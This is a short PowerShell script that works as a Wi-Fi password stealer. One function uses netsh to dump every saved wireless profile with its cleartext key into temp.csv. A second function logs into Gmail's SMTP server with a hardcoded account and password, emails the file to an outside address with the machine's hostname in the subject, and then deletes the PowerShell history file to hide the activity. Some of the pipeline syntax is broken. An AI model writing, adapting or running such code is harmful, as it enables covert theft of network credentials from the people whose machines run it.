function methane
{
    (netsh wlan show profiles)
    Select-String '\\:(.+)$'
    %{$name=$_.Matches.Groups[1].Value.Trim(); $_}
    %{(netsh wlan show profile name=$name key=clear)}
    Select-String 'Key Content\\W+\\:(.+)$'
    %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
    %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}
    Export-Csv temp.csv")
  Send-Creds
}

function Send-Creds
{
    $SMTPServer = 'smtp.gmail.com'
    $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
    $SMTPInfo.EnableSsl = $true
    $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('jerrycarre4444@gmail.com', 'ourkindoftraitor')
    $ReportEmail = New-Object System.Net.Mail.MailMessage
    $ReportEmail.From = 'jerrycarre4444@gmail.com'
    $ReportEmail.To.Add('warof1846@gmail.com')
    $ReportEmail.Subject = 'Credentials - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
    $ReportEmail.Attachments.Add("temp.csv")
    $SMTPInfo.Send($ReportEmail)
    del (Get-PSReadlineOption).HistorySavePath\
}

methane
